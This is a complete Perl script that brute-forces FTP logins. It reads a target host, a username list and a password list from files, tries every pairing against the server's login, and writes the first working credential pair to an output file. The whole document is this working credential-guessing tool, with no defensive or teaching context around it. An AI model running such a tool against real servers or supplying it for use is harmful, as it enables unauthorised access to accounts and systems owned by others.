#!perl
use Data::Dumper;
use strict;
use Net::FTP;

unless ( @ARGV ) { print q[Error: argument list is empty], "\n"; exit(0); };

my ( @target, @users, @passw, $cnt, $ftp, );

@target	= &getinput( $ARGV[0] ) if ( $ARGV[0] );
my $outfile = $ARGV[1];
@users	= &getinput( $ARGV[2] ) if ( $ARGV[2] );
@passw	= &getinput( $ARGV[3] ) if ( $ARGV[3] );

open(OUTFILE, ">>$outfile");

 if ( $ftp = Net::FTP->new( $target[0] ) ) {

  map {

	  my $user = $_; chomp( $user );
	  map {

		  my $try = $_; chomp( $try );

		  if( $ftp->login( $user, $try ) ) {

			print OUTFILE qq[pair $user:$try is good for $target[0]\n];
			close OUTFILE;
			exit(0);

		  }
			$cnt++;
		  sleep(1);

	  } @passw;

  } @users;

  print OUTFILE qq[tried $cnt user:pass combinations on $target[0], none succeeded...\n];

}
else { print OUTFILE qq[Error: failed to connect to $target[0]\n]; }

$ftp->quit();

close(OUTFILE);

exit(0);

sub getinput {

  my $fi = shift;

  if ( open( IN, '<:utf8', $fi ) ) {

	my @fo;

	while( <IN> ){ s/^(\S+)$/{ push @fo, $1; }/e; }

	close( IN );

	return @fo; # if ( scalar @fo > 1 );
	# return $fo[0];

  }
  else { print q[Error: cannot open file ], $fi, "\n"; exit(0); }

};